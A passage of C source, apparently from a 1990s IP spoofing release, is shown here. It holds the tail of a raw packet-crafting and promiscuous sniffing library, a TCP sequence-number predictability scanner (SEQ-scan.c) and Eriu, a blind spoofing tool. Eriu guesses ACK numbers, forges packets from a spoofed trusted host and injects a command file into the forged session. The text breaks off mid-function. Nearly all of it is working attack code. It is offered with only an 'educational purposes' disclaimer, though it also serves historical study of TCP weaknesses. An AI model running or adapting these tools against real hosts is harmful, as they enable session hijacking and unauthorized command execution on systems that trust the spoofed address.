+sp_help_icmp->checksum=in_cksum((unsigned short *) sp_help_icmp, 
+				  ICMP_HEAD_BASE+IP_HEAD_BASE+64);
+#ifdef DEBUG
+	printf("ICMP header fixed...\n");
+#endif
+}
+
+/* in a raw, unfinished state... */
+void transmit_ICMP (int sp_fd, char *sp_data, 
+			   int sp_ipoptlen, int sp_datalen, 
+		           char *sp_source,
+			   char *sp_dest, unsigned short sp_dest_port,
+			   char *sp_unr_d, unsigned short sp_unr_d_port,
+			   unsigned char sp_type, unsigned char sp_code)
+{
+char sp_buffer[1500];
+struct sp_data_exchange sp_struct;
+
+bzero(sp_buffer,1500);
+if (sp_ipoptlen!=0) 
+	memcpy(sp_buffer+IP_HEAD_BASE,sp_data,sp_ipoptlen);
+
+if (sp_datalen!=0) 
+	memcpy(sp_buffer+IP_HEAD_BASE+ICMP_HEAD_BASE+sp_ipoptlen,
+			sp_data+sp_ipoptlen,sp_datalen);
+
+sp_struct.fd          = sp_fd; 
+sp_struct.data        = sp_data;
+sp_struct.datalen     = IP_HEAD_BASE+64;          /* CHANGE LATER!!!! */ 
+sp_struct.source      = sp_source;
+sp_struct.xtra        = sp_unr_d;
+sp_struct.xtra_port   = sp_unr_d_port;
+sp_struct.dest        = sp_dest;
+sp_struct.dest_port   = sp_dest_port;
+sp_struct.buffer      = sp_buffer;
+sp_struct.IP_optlen   = sp_ipoptlen;          
+sp_struct.ICMP_type   = sp_type;          
+sp_struct.ICMP_code   = sp_code;          
+
+sp_fix_ICMP_packet(&sp_struct);
+sp_fix_IP_packet(&sp_struct, 1);
+sp_send_packet(&sp_struct, 1);
+}
+
+/* This routine stolen from ping.c -- HAHAHA!*/
+unsigned short in_cksum(unsigned short *addr,int len)
+{
+register int nleft = len;
+register unsigned short *w = addr;
+register int sum = 0;
+unsigned short answer = 0;
+        
+while (nleft > 1)
+        { 
+        sum += *w++;
+        nleft -= 2;
+        }
+if (nleft == 1)
+        {
+        *(u_char *)(&answer) = *(u_char *)w ;
+        sum += answer;
+        }
+sum = (sum >> 16) + (sum & 0xffff);
+sum += (sum >> 16);
+answer = ~sum;
+return(answer);
+}
+
+/************************* Receiving department  ****************************/
+
+int open_receiving (char *rc_device, char mode)
+{
+int or_fd;
+struct sigaction rc_sa;
+int fcntl_flag;
+struct ifreq ifinfo;
+char test;
+
+/* create snoop socket and set interface promisc */
+if ((or_fd = socket(AF_INET, SOCK_PACKET, htons(0x3)))==-1) 
+        perror("Couldn't open Socket."), exit(1);
+strcpy(ifinfo.ifr_ifrn.ifrn_name,rc_device);
+if(ioctl(or_fd,SIOCGIFFLAGS,&ifinfo)<0)
+	perror("Couldn't get flags."), exit(1);
+ifinfo.ifr_ifru.ifru_flags |= IFF_PROMISC;
+if(ioctl(or_fd,SIOCSIFFLAGS,&ifinfo)<0)
+	perror("Couldn't set flags. (PROMISC)"), exit(1);
+
+if(mode&IO_HANDLE)
+	{		/* install handler */
+	rc_sa.sa_handler=rc_sigio;        /* we don't use signal()        */
+	sigemptyset(&rc_sa.sa_mask);      /* because the timing window is */
+	rc_sa.sa_flags=0;                 /* too big...                   */
+	sigaction(SIGIO,&rc_sa,NULL);
+	}
+
+if(fcntl(or_fd,F_SETOWN,getpid())<0)
+	perror("Couldn't set ownership"), exit(1);
+
+if(mode&IO_HANDLE)
+	{
+	if( (fcntl_flag=fcntl(or_fd,F_GETFL,0))<0)
+		perror("Couldn't get FLAGS"), exit(1);
+	if(fcntl(or_fd,F_SETFL,fcntl_flag|FASYNC|FNDELAY)<0)
+		perror("Couldn't set FLAGS"), exit(1);
+        rc_fd_abc123=or_fd;
+	}
+else 
+	{
+	if(mode&IO_NONBLOCK)
+		{
+		if( (fcntl_flag=fcntl(or_fd,F_GETFL,0))<0)
+			perror("Couldn't get FLAGS"), exit(1);
+		if(fcntl(or_fd,F_SETFL,fcntl_flag|FNDELAY)<0)
+			perror("Couldn't set FLAGS"), exit(1);
+		};
+	};
+
+#ifdef DEBUG
+	printf("Reading socket ready\n");
+#endif
+return or_fd;
+}
+
+/* returns 0 when no packet read!  */
+int get_packet (int rc_fd, char *buffer, int *TCP_UDP_start,unsigned  char *proto) 
+{
+char help_buffer[MTU];
+int pack_len;
+struct IP_header *gp_IPhead;
+
+pack_len = read(rc_fd,help_buffer,1500);
+if(pack_len<0)
+	{
+	if(errno==EWOULDBLOCK) 
+		{pack_len=0;}
+	else
+		{perror("Read error:"); exit(1);}
+	};
+if(pack_len>0)
+	{
+	pack_len -= DEV_PREFIX;
+	memcpy(buffer,help_buffer+DEV_PREFIX,pack_len);
+	gp_IPhead = (struct IP_header *) buffer;
+	if(proto != NULL)
+		*proto = gp_IPhead->protocol;
+	if(TCP_UDP_start != NULL)
+		*TCP_UDP_start = (gp_IPhead->verlen & 0xF) << 2;
+	}
+return pack_len;
+}
+
+void wait_packet_timeout (int sig)
+{
+alarm(0);
+WAIT_PACKET_WAIT_TIME=1;
+}
+
+int wait_packet(int wp_fd,struct sp_wait_packet *ret_values,
+                char *wp_source, unsigned short wp_source_port,
+                char *wp_dest, unsigned short wp_dest_port, int wp_flags, 
+		int wait_time) 
+{
+char wp_buffer[1500];
+struct IP_header *wp_iphead;
+struct TCP_header *wp_tcphead;
+unsigned long wp_sourcel, wp_destl;
+int wp_tcpstart;
+char wp_proto;
+
+wp_sourcel=sp_getaddrbyname(wp_source);
+wp_destl=sp_getaddrbyname(wp_dest);
+
+WAIT_PACKET_WAIT_TIME=0;
+if(wait_time!=0)
+	{
+	signal(SIGALRM,wait_packet_timeout);
+	alarm(wait_time);
+	}	
+
+while(1)
+  {
+  while(get_packet(wp_fd, wp_buffer, &wp_tcpstart, &wp_proto)<=0) 
+	{
+	if (WAIT_PACKET_WAIT_TIME!=0)	{alarm(0); return -1;}
+	};
+  if(wp_proto == 6)
+    {
+    wp_iphead= (struct IP_header *) wp_buffer;
+    wp_tcphead= (struct TCP_header *) (wp_buffer+wp_tcpstart);
+    if( (wp_sourcel==wp_iphead->source)&&(wp_destl==wp_iphead->destination) )
+      {
+      if( ((ntohs(wp_tcphead->source)==wp_source_port)||(wp_source_port==0)) &&
+          ((ntohs(wp_tcphead->destination)==wp_dest_port)||(wp_dest_port==0)) )
+        {
+        if( (wp_flags==0) || (ntohs(wp_tcphead->offset_flag)&wp_flags) )
+          {
+          ret_values->source_p=ntohs(wp_tcphead->source);
+          ret_values->dest_p=ntohs(wp_tcphead->destination);
+          ret_values->seq=ntohl(wp_tcphead->seq_nr);
+          ret_values->ack=ntohl(wp_tcphead->ACK_nr);
+          ret_values->flags=ntohs(wp_tcphead->offset_flag)&
+						(URG|ACK|PSH|FIN|RST|SYN);
+          ret_values->datalen = ntohs(wp_iphead->length) -            
+                           ((wp_iphead->verlen & 0xF) << 2) -
+                            ((ntohs(wp_tcphead->offset_flag) & 0xF000) >> 10);
+          alarm(0);
+          return 0;
+          }
+        }
+      }
+    }
+  }
+/*impossible to get here.. but anyways*/
+alarm(0); return -1;
+}
+
+
+void close_receiving (void)
+{
+close(rc_fd_abc123);
+}
+
+void rc_sigio (int sig)                     /* Packet handling routine */
+{
+char rc_buffer[1500];
+char packet_id [50];
+unsigned char *rc_so, *rc_dest;
+struct IP_header *rc_IPhead;
+struct TCP_header *rc_TCPhead;
+int pack_len;
+
+if(RC_FILTSET==0) return;
+
+if(SP_DATA_BUSY!=0)              /* skip this packet */
+	return;     
+
+pack_len = read(rc_fd_abc123,rc_buffer,1500);
+rc_IPhead = (struct IP_header *) (rc_buffer + DEV_PREFIX);
+if(rc_IPhead->protocol!=6) return;                          /* if not TCP */
+rc_TCPhead = (struct TCP_header *) (rc_buffer + DEV_PREFIX + ((rc_IPhead->verlen & 0xF) << 2));
+   
+rc_so   = (unsigned char *) &(rc_IPhead->source);
+rc_dest = (unsigned char *) &(rc_IPhead->destination);   
+sprintf(packet_id,"%u.%u.%u.%u.%u-%u.%u.%u.%u.%u",
+	      rc_so[0],rc_so[1],rc_so[2],rc_so[3],ntohs(rc_TCPhead->source),
+	      rc_dest[0],rc_dest[1],rc_dest[2],rc_dest[3],ntohs(rc_TCPhead->destination)); 
+	
+if(strcmp(packet_id,rc_filter_string)==0)
+	{ 
+	SP_DATA_BUSY=1;
+	CUR_SEQ = ntohl(rc_TCPhead->seq_nr);
+	CUR_ACK = ntohl(rc_TCPhead->ACK_nr);
+        CUR_FLAGS = ntohs(rc_TCPhead->offset_flag);
+	CUR_DATALEN = ntohs(rc_IPhead->length) - 
+		      ((rc_IPhead->verlen & 0xF) << 2) -
+                      ((ntohs(rc_TCPhead->offset_flag) & 0xF000) >> 10);
+	CUR_COUNT++;
+	SP_DATA_BUSY=0;
+	}
+}
+
+void set_filter (char *f_source, unsigned short f_source_port,
+                 char *f_dest, unsigned short f_dest_port)
+{
+unsigned char *f_so, *f_des;
+unsigned long f_sol, f_destl;
+
+RC_FILTSET=0;
+if(DEV_PREFIX==9999)
+	fprintf(stderr,"DEV_PREFIX not set!\n"), exit(1);
+f_sol   = sp_getaddrbyname(f_source);
+f_destl = sp_getaddrbyname(f_dest);
+f_so    = (unsigned char *) &f_sol;
+f_des   = (unsigned char *) &f_destl;   
+sprintf(rc_filter_string,"%u.%u.%u.%u.%u-%u.%u.%u.%u.%u",
+		              f_so[0],f_so[1],f_so[2],f_so[3],f_source_port,	
+			      f_des[0],f_des[1],f_des[2],f_des[3],f_dest_port); 
+RC_FILTSET=1;
+}
+
+----------------------------------------------------------------------------
+
+--[SEQ-scan.c]--------------------------------------------------------------
+/**************************************************************************/
+/*  SEQ-scan - Example program for scanning SEQ-nr generators             */
+/*             (illustration for 'A short overview of IP spoofing')       */
+/*                                                                        */
+/*  Purpose - Gaining information about the targets SEQ-nr generator      */
+/*                                                                        */
+/*  Author - Brecht Claerhout <Coder@reptile.rug.ac.be>                   */
+/*           Serious advice, comments, statements, greets, always welcome */
+/*           flames, moronic 3l33t >/dev/null                             */
+/*                                                                        */
+/*  Disclaimer - This program is for educational purposes only. I am in   */
+/*               NO way responsible for what you do with this program,    */
+/*               or any damage you or this program causes.                */
+/*                                                                        */
+/*  For whom - People with a little knowledge of TCP/IP, C source code    */
+/*             and general UNIX. Otherwise, please keep your hands of,    */
+/*             and catch up on those things first.                        */
+/*                                                                        */
+/*  Limited to - Linux 1.3.X or higher.                                   */
+/*               Watch the devices! default is 'eth0' you might have to   */
+/*               change that. Read the code...                            */
+/*                                                                        */
+/*  Compiling - gcc -o SEQ-scan SEQ-scan.c -lm                            */
+/*                                                                        */
+/*  Usage - Usage described in the spoofing article that came with this.  */
+/*          If you didn't get this, try to get the full release...        */
+/*                                                                        */
+/*  See also - Sniffit (for getting the necessairy data on a connection)  */
+/**************************************************************************/
+
+#include "spoofit_v3.h"               
+#include <math.h>
+#include <sys/time.h>
+
+/*** Network device info, you could have to change this ***/
+#define INTERFACE	"eth0"                    
+#define INTERFACE_PREFIX 14                           
+/* 
+#define INTERFACE	"ppp0" 
+#define INTERFACE_PREFIX 0     
+*/
+
+#define MAXSEQ		10                                 /* array length*/
+#define STARTSEQ	0x9E2CF343     /* You might want a personal touch */
+#define STARTPORT       10666           /* You might want a personal touch */
+               
+char SOURCE[200];                              /* required hostinformation */ 
+char TARGET[200];
+int TARGET_P;
+
+int fd_receive, fd_send;                                /* Kinda selfexpl. */
+unsigned long SEQ_list[MAXSEQ];
+unsigned long diff_seq[MAXSEQ];
+struct timeval time_list[MAXSEQ];
+struct timeval time_diff[MAXSEQ];
+double time_diff_usec[MAXSEQ];
+double incr_per_usec[MAXSEQ];
+double incr_per_usec2[MAXSEQ];
+
+char VERBOSE=0, DO_ALL=0;                                       /* Options */
+int COUNT=MAXSEQ;                  /* I leave you all freedom for adjusting*/
+
+int get_seq_nrs(unsigned long *, int, int );
+void get_numbers(void);
+int easy_64k_rule(void);
+void simple_time_relation (void);
+void rm_minmax(double *, double *, int);
+void timeval_substract (struct timeval *,struct timeval *,struct timeval *);
+
+void quit(char *progname)
+{
+printf("usage: %s <args> [options]\n", progname);
+printf("required <args> are:\n");
+printf("  -t <target>  host you want to scan\n");
+printf("  -p <port>    port you want to use for scanning\n");
+printf("[options] are:\n");
+printf("  -v           verbose\n");
+printf("  -a           do all tests\n");
+exit(1);
+}
+  
+int main(int argc, char *argv[]) 
+{ 
+int i,c;
+char required=0;
+extern char *optarg;
+
+while((c=getopt(argc, argv,"s:t:p:va"))!=-1)
+  { 
+  switch(c)
+	{
+        case 'v': printf("Verbose mode on...\n"); VERBOSE=1;    /* VERBOSE */
+                  break;
+	case 'p': TARGET_P=atoi(optarg); required |=2; break;
+        case 't': strcpy(TARGET,optarg); required |=1; break;
+	case 'a': DO_ALL=1; break;
+	default : quit(argv[0]); break;
+	};
+  }
+SOURCE[199]=0;
+if(gethostname(SOURCE,199)<0)
+  {fprintf(stderr,
+               "Error: Couldn't determine host name... what's happening??");}
+if(required != 3)
+        {quit(argv[0]);}
+
+DEV_PREFIX = INTERFACE_PREFIX;
+
+get_numbers();                                           /* get some data  */
+if((easy_64k_rule()==1)&&(!DO_ALL))                   /* 64K rule checking */
+  exit(0);
+simple_time_relation();                                 /* Simple relation */ 
+}
+
+/*** NUMBER CRUNCHING ;) ***************************************************/
+
+int easy_64k_rule(void)
+{
+int i, seq_vuln=0;
+
+if(VERBOSE)
+    {printf("*** 64K rule checking\n");}
+for(i=1;i<COUNT;i++)
+  {
+  diff_seq[0]=SEQ_list[i]-SEQ_list[i-1];
+  if(VERBOSE)
+    {printf("SEQ. difference: %lu\n",diff_seq[0]);}
+  if(diff_seq[0]%64000 == 0)
+    seq_vuln++;
+  }
+if(seq_vuln>2)                                 /* allow some errors */
+  {printf("%s vulnerable! (64K rule)\n",TARGET); return 1;}
+else
+  {printf("%s checked. (64K rule)\n",TARGET); return 0;}
+diff_seq[0]=0;
+}
+
+void simple_time_relation (void)
+{
+int i;
+unsigned long diff_average[2];
+double incr_err, incr_err2;
+double incr_avr, incr_avr2;
+double time_avr;
+
+if(VERBOSE)
+    {printf("*** Simple relation checking\n");}
+
+time_avr=incr_avr=0;
+for(i=1;i<COUNT;i++)                                  /* time calculations */
+  {
+  timeval_substract (&(time_diff[i-1]), &(time_list[i]),&(time_list[i-1]));
+  diff_seq[i-1]=SEQ_list[i]-SEQ_list[i-1];
+  time_diff_usec[i-1] = 1000000*((double)(time_diff[i-1].tv_sec)) + 
+                        (double)(time_diff[i-1].tv_usec) ;
+  incr_per_usec[i-1]=(double)(diff_seq[i-1])/time_diff_usec[i-1];
+  if(VERBOSE)
+     {printf("TIME diff: %f(us)   SEQ diff: %lu    incr: %f (1/us)\n",
+		      time_diff_usec[i-1],diff_seq[i-1], incr_per_usec[i-1]);}
+  time_avr += time_diff_usec[i-1];
+  incr_avr += incr_per_usec[i-1];
+  }
+time_avr /= (COUNT-1);
+incr_avr /= (COUNT-1);
+if(VERBOSE)
+  {printf("TIME avr: %f(us)   incr avr: %f (1/us)\n",time_avr, incr_avr);}
+
+incr_err=0;
+for(i=1;i<COUNT;i++)
+  {incr_err+=(incr_avr - incr_per_usec[i-1])*(incr_avr - incr_per_usec[i-1]);}
+incr_err = sqrt(incr_err);
+if(VERBOSE)
+  {printf("QUAD ERR: %f\n",incr_err);}
+
+if(VERBOSE)
+  {printf("Removing 2 extreme values...\n");}
+rm_minmax(incr_per_usec2, incr_per_usec, COUNT-1); 
+incr_err2=incr_avr2=0; 
+for(i=1;i<(COUNT-2);i++)
+  {incr_avr2+=incr_per_usec2[i-1];}
+incr_avr2 /= (COUNT-3);
+
+for(i=1;i<(COUNT-2);i++)
+  {incr_err2+=(incr_avr - incr_per_usec2[i-1])*
+                                            (incr_avr -incr_per_usec2[i-1]);}
+incr_err2 = sqrt(incr_err2);
+
+if(VERBOSE)
+  {printf("QUAD ERR2: %f\n",incr_err2);}
+
+/* Reporting */
+if((incr_err<10)||(incr_err2<10))
+  {printf("%s time relation found. (err: %f)\n",TARGET,
+				(incr_err<10) ? incr_err : incr_err2);
+  return;
+  };
+printf("%s checked. (time rel. err: %f and %f)\n",TARGET,incr_err,incr_err2);
+} 
+
+/* remove minimum and maximum from a list */
+void rm_minmax(double *newlist, double *oldlist, int len) 
+{ 
+int i, j=0, rm_max=0, rm_min=0; 
+double hlp_max, hlp_min; 
+  
+hlp_min=hlp_max=oldlist[0];
+for(i=1;i<len;i++)
+  {
+  if(hlp_min>oldlist[i])
+    {hlp_min=oldlist[i]; rm_min=i;}
+  if(hlp_max<oldlist[i])
+    {hlp_max=oldlist[i]; rm_max=i;}
+  }
+
+for(i=0;i<len;i++)
+  {
+  if((i!=rm_min)&&(i!=rm_max))
+    {newlist[j]=oldlist[i]; j++;}
+  }
+}
+
+/* time substraction, time x - time y */
+void timeval_substract (result,x,y)
+        struct timeval *result, *x, *y;
+{
+long hlp_usec;
+
+result->tv_sec = x->tv_sec - y->tv_sec;
+if(y->tv_usec > x->tv_usec)   
+  {
+  (result->tv_sec)--;
+  hlp_usec = 1000000 - y->tv_usec;
+  result->tv_usec = x->tv_usec + hlp_usec; 
+  }
+else
+  {
+  result->tv_usec = x->tv_usec -  y->tv_usec;
+  };
+}
+
+/*** NETWORKING PART *******************************************************/
+void get_numbers(void)                                 /* get some SEQ-nrs */
+{
+fd_send = open_sending();
+fd_receive = open_receiving(INTERFACE, IO_NONBLOCK); 
+
+if(get_seq_nrs(SEQ_list, COUNT, 0)<0)
+  {printf("%s time out. (SEQ scanning)\n",TARGET); exit(1);};
+}
+
+int get_seq_nrs(unsigned long *list_seq, int packs, int sec_delay) 
+{ 
+int i, stat;
+int tcpstart; 
+char proto; 
+short port;
+char buffer[1500]; 
+struct IP_header *iphead; 
+struct TCP_header *tcphead; 
+struct sp_wait_packet pinfo;
+
+port=STARTPORT; 
+for(i=0;i<packs;i++)
+  {
+  sleep(sec_delay);
+  port++;
+  transmit_TCP(fd_send, NULL, 0,0,0, SOURCE, port, TARGET, TARGET_P, 
+	 			     	                  STARTSEQ+i,0, SYN);
+  stat=wait_packet(fd_receive,&pinfo,TARGET,TARGET_P,SOURCE,port,SYN,20);
+  gettimeofday(&(time_list[i]),NULL);            
+  if(stat<0)
+	{return -1;}
+  else  {list_seq[i]=pinfo.seq;
+         if(pinfo.seq==0)
+           {printf("\nThis port doesn't accept connections...\n");exit(1);}
+        };
+  }
+/* RESET auto, because our host sends RESET    */
+return 0;
+}
+
+----------------------------------------------------------------------------
+
+--[eriu.c]------------------------------------------------------------------
+/**************************************************************************/
+/*  Eriu - Blind spoofing utility                                         */
+/*         (illustration for 'A short overview of IP spoofing')           */
+/*                                                                        */
+/*  Purpose - demonstration of spoofing attacks                           */
+/*                                                                        */
+/*  Author - Brecht Claerhout <Coder@reptile.rug.ac.be>                   */
+/*           Serious advice, comments, statements, greets, always welcome */
+/*           flames, moronic 3l33t >/dev/null                             */
+/*                                                                        */
+/*  Disclaimer - This program is for educational purposes only. I am in   */
+/*               NO way responsible for what you do with this program,    */
+/*               or any damage you or this program causes.                */
+/*                                                                        */
+/*  For whom - People with a little knowledge of TCP/IP, C source code    */
+/*             and general UNIX. Otherwise, please keep your hands of,    */
+/*             and catch up on those things first.                        */
+/*                                                                        */
+/*  Limited to - Linux 1.3.X or higher.                                   */
+/*               Watch the devices! default is 'eth0' you might have to   */
+/*               change that. Read the code...                            */
+/*                                                                        */
+/*  Compiling - gcc -o eriu eriu.c                                        */
+/*                                                                        */
+/*  Usage - Usage described in the spoofing article that came with this.  */
+/*          If you didn't get this, try to get the full release...        */
+/*                                                                        */
+/*  See also - Sniffit (for getting the necessairy data on a connection)  */
+/**************************************************************************/
+#include "spoofit_v3.h"
+
+/*** Network device info, you could have to change this ***/
+#define INTERFACE	"eth0"                    
+#define INTERFACE_PREFIX 14                           
+/* 
+#define INTERFACE	"ppp0" 
+#define INTERFACE_PREFIX 0     
+*/
+
+#define VERSION "0.1"
+
+#define TIMEOUT		20	                /* packet receive timeout */
+#define SCANCOUNT	5	      /* packets send during initial scan */
+                                      /* Should be 5 or bigger            */
+#define SCANSEQ		0x3E65F666        /* SEQ number used for scanning */
+#define SPOOFSEQ	0x223EE666           /* SEQ number used for spoof */
+
+char DEBUG=0;
+char SRC[200], TGT[200], ME[200];
+unsigned short SRC_P, TGT_P, SCANTGT_P=23;
+unsigned short my_p=6666;     /* need to count ports on to avoid problems */
+
+int fd_send, fd_receive;
+
+void eriu(void)
+{
+printf("Eriu -- Version %s  (by Brecht Claerhout",VERSION);
+printf(" <coder@reptile.rug.ac.be>)\n");
+}
+
+void quit (char *name)
+{
+printf("usage: %s <arguments>\n",name);
+printf("Arguments are:\n");
+printf("  -s host:port  Spoofed Host (required)\n");
+printf("  -t host:port  Target Host (required)\n");
+printf("  -f filename   Packet contence commandfile");
+printf(" (required, except with '-P')\n");
+printf("  -p port       Source Port used for scanning (default 23)\n");
+printf("  -c count      Number of guesses to make");
+printf(" (default 64k:20 other:500)\n");
+printf("  -o offset     Extra offset to add to guessed ACK\n");
+printf("  -d delay      Seconds of delay between parts of the attack");
+printf(" (default:1)\n");
+printf("  -P            Probe for guessing range\n");
+printf("  -F            Enter the ACK guess y'rself");
+printf(" (test/practice purposes)\n");
+exit(1);
+}
+
+char *get_local (void)  /* get y'r own hostname */
+{
+char hlp[200];
+
+hlp[199]=0;
+if(gethostname(hlp,199)<0)
+  {fprintf(stderr,"\nError: Couldn't determine host name...\n");
+   exit(1);}
+strcpy(ME,hlp);
+return ME;
+}
+
+main(int argc, char *argv[])
+{
+unsigned long i,j;
+int stop=0, FORCE=0;
+int is_64k=0, countstep=1,buf_pos;
+unsigned long count=0;
+unsigned char buffer[1500];
+unsigned char hlp[200], *hlp2;
+unsigned char cmdfile[200];                        /* name of commandfile */ 
+char c, required=0; 
+unsigned long SEQ_list[SCANCOUNT];                      /*list of SEQ nrs */
+unsigned long ACK_avrg, ACK_guess, ACK_spoof, ACK_start;     
+unsigned long SEQ_spoof;
+long ACK_offset=0;                           /* extra ACK offset (signed) */
+FILE *cmd;
+struct sp_wait_packet pinfo;                               /* For probing */
+int stat;
+int sec_delay=1;                                         /* delay setting */
+
+eriu();                                   /* give meaning to this program */
+
+while((c=getopt(argc, argv,"s:t:p:c:D:f:FPd:o:"))!=-1)
+  { 
+  hlp[199]=0;
+  switch(c)
+	{
+        case 's': 
+           strncpy(hlp,optarg,199); 
+           if((hlp2=(unsigned char *)strtok(hlp,":"))==NULL) quit(argv[0]);
+           strcpy(SRC,hlp2);          
+           if((hlp2=(unsigned char *)strtok(NULL,":"))==NULL) quit(argv[0]);
+           SRC_P=atoi(hlp2);          
+           required |=1; 
+           break;
+        case 't': 
+           strncpy(hlp,optarg,199); 
+           if((hlp2=(unsigned char *)strtok(hlp,":"))==NULL) quit(argv[0]);
+           strcpy(TGT,hlp2);          
+           if((hlp2=(unsigned char *)strtok(NULL,":"))==NULL) quit(argv[0]);
+           TGT_P=atoi(hlp2);          
+           required |=2; 
+           break;
+        case 'f':
+           strncpy(cmdfile,optarg,199);
+           required |=4;
+           break;
+        case 'p':
+           SCANTGT_P=atoi(optarg);
+           break;
+        case 'c':
+           count=atol(optarg);
+           break;
+        case 'D': 
+           if(strcmp(optarg,"DEBUG")!=0) quit(argv[0]); 
+           DEBUG=1;
+           break;
+        case 'F':
+           FORCE=1; /* test purpose */ 
+           break;
+        case 'P':
+           FORCE=2; /* Probe */ 
+           break;
+        case 'd':
+           sec_delay=atoi(optarg);
+           break;
+        case 'o':
+           ACK_offset=atol(optarg);
+           break;
+        default : 
+           quit(argv[0]); 
+           break;
+	};
+  }
+if( (((FORCE&2)==0)&&(required!=7))||(((FORCE&2)==2)&&(required != 3)) )
+        {quit(argv[0]);}
+DEV_PREFIX = INTERFACE_PREFIX;
+
+printf("Checking permissions... ");                  /* rootpermissions ? */
+if((getuid()!=0)&&(geteuid()!=0))
+  {printf("NO ROOT\n"); exit(1);}
+fd_send = open_sending();                            /* open some sockets */
+fd_receive = open_receiving(INTERFACE, IO_NONBLOCK); 
+printf("OK\n");
+
+printf("Opening command file... ");      /* see if there is a commandfile */
+if(FORCE!=2)
+  {
+  if((cmd=fopen(cmdfile,"r"))==NULL)
+    {printf("FIALED\n"); perror("ERROR"); exit(1);}
+  printf("OK\n");
+  }  
+else
+  {printf("SKIPPED\n");}
+
+printf("Determining local IP adress... %s\n",get_local());
+printf("Trying to determine if Target System is 64K ruler...\n");
+printf("   Probing Target System... "); fflush(stdout);
+if(FORCE!=1)
+  {
+  if(get_seq_nrs(SEQ_list,SCANCOUNT,0)<0)
+    {fprintf(stderr,"\nError: Packet timed out, giving up...\n"); exit(1);}
+ j=0;
+  for(i=0;i<SCANCOUNT;i++)
+    if( SEQ_list[i]==0 )
+      j++;
+  if(j>=SCANCOUNT-1)
+    {printf("FAILED\nAccess denied on scan port...\n"); exit(1);}  
+  printf("OK\n");
+ 
+  j=0;
+  for(i=1;i<SCANCOUNT;i++)
+    if( ((SEQ_list[i]-SEQ_list[i-1])%64000)==0 )
+      j++;
+  if(j>=(SCANCOUNT/2))
+    {printf("   Target System is 64k ruler...\n");
+     countstep=64000; is_64k=1;}
+
+  if(count==0)             /* Set number of packets to complete handshake */
+    {if(is_64k==1) count=20;
+     else count=500;}
+  }
+else /* skip if Forcing ACK */
+  {printf("SKIPPED\n"); 
+   if(count==0) count=1;};
+
+sleep(sec_delay);                                        /* wait a second */
+SEQ_spoof=SPOOFSEQ;
+printf("Probing Target system for attack... "); fflush(stdout);
+if(FORCE!=1)
+  {
+  if(is_64k==1)
+    {
+    if(get_seq_nrs(SEQ_list,2,0)<0) /* one to wake up */
+      {fprintf(stderr,"\nError: Packet timed out, giving up...\n");
+       exit(1);}
+    ACK_guess=SEQ_list[1]+64000;
+    }
+  else
+    {
+    if(get_seq_nrs(SEQ_list,5,0)<0) /* one to wake up */
+      {fprintf(stderr,"\nError: Packet timed out, giving up...\n"); 
+       exit(1);}
+    ACK_avrg=(SEQ_list[4]-SEQ_list[1])/3;
+    ACK_guess=SEQ_list[4]+ACK_avrg;
+    }
+  ACK_guess++; /* one bigger then the SEQ generated */
+  ACK_guess+=ACK_offset;
+  printf("OK\n");
+  }
+else /* for force */
+  {
+  printf("SKIPPED\n");
+  }
+
+if(FORCE!=2)
+  transmit_TCP(fd_send, NULL,0,0,0,SRC, SRC_P, TGT, TGT_P, 
+                                                          SEQ_spoof,0, SYN);
+else                                                       /* for probing */
+  {
+  transmit_TCP(fd_send, NULL,0,0,0,ME, SRC_P, TGT, TGT_P, SEQ_spoof,0, SYN);
+  stat=wait_packet(fd_receive,&pinfo,TGT,TGT_P,ME,SRC_P,SYN|ACK,TIMEOUT);
+  if(stat<0)
+    {fprintf(stderr,"\nError: Packet timed out, giving up...\n"); exit(1);}
+  ACK_spoof=pinfo.seq+1; /* autoreset by our host */
+  printf("Guessed ACK: %X  Probed ACK: %X\n",ACK_guess,ACK_spoof);
+  printf("Difference: %X (or decimal: %lu)\n",
+                      labs(ACK_spoof-ACK_guess), labs(ACK_spoof-ACK_guess));
+  exit(0);  
+  }
+SEQ_spoof++;
+printf("SYN packet fired...\n");
+
+if(FORCE!=0)                                                /* Force mode */
+  { printf("Give ACK to force (hex): "); fflush(stdout);
+  scanf("%lx",&ACK_guess);}
+printf("Guessed ACK: %X\n",ACK_guess);
+
+sleep(sec_delay);                                             /* Guesses */
+printf("Sending guessed ACK's... "); fflush(stdout);
+j=count/2;
+ACK_start=ACK_guess-(j*countstep);
+for(i=0;i<count;i++)
+  {
+  ACK_spoof=ACK_guess+((i-j)*countstep);
+  transmit_TCP(fd_send, NULL,0,0,0,SRC,SRC_P,TGT,TGT_P,SEQ_spoof,
+                                                             ACK_spoof,ACK);
+  }
+printf("DONE\nConnection hopefully established...\n");
+
+sleep(sec_delay);
+printf("Executing command file...\n");
+
+buf_pos=0;
+hlp[3]=0;
+while(stop==0)
+  {
+  hlp[0]=getc(cmd);
+  if(feof(cmd)!=0)  {hlp[0]=10; stop=1;}   /* if there is no enter on the */ 
+                                           /* last line                   */
+  switch(hlp[0])
+    {
+    case '\\':
+      hlp[0]=getc(cmd); hlp[1]=getc(cmd); hlp[2]=getc(cmd);
+      if((hlp[0]=='a')||(hlp[0]=='A'))
+	 {
+         hlp[0]='0';
+         ACK_start+=atoi(hlp);
+         /* printf("[ACK %u]",(unsigned char)atoi(hlp));fflush(stdout); */
+         }
+      else
+         {
+         buffer[buf_pos]=(unsigned char)atoi(hlp); 
+         buf_pos++;
+         /* printf("[%u]",(unsigned char)atoi(hlp));fflush(stdout); */
+         }
+      break;
+    case 10:
+      if(buf_pos==0)  
+        {
+        printf("Firing packet (ACK)... ");
+        transmit_TCP(fd_send, NULL,0,0,0,SRC,SRC_P,TGT,TGT_P,
+                                               SEQ_spoof,ACK_start,ACK);
+        printf("DONE\n");
+        break;
+        }
+      printf("Firing packet (DATA)... ");
+      transmit_TCP(fd_send, buffer,0,0,buf_pos,SRC,SRC_P,TGT,TGT_P,
+                                               SEQ_spoof,ACK_start,PSH|ACK);
+      SEQ_spoof+=buf_pos;
+      buf_pos=0;
+      printf("DONE\n");
+      sleep(sec_delay);
+      break;
+    default:
+      buffer[buf_pos]=hlp[0];
+      buf_pos++;
+      /* printf("%c",hlp[0]);fflush(stdout); */
+      break;
+    }
+  }
+
+sleep(sec_delay);            /* We are nice ppl, we close our connections */
+printf("Cleaning up (RST)...\n");
+transmit_TCP(fd_send, NULL,0,0,0,SRC,SRC_P,TGT,TGT_P, SEQ_spoof,
+                                                             ACK_start,RST);
+fclose(cmd);
+close(fd_send);
+close(fd_receive);
+}
+
+/* getting a list of SEQ-nrs from the target */
+int get_seq_nrs(unsigned long *seqlist, int nr_of_packs, int sec_delay) 
+{ 
+int i, stat;
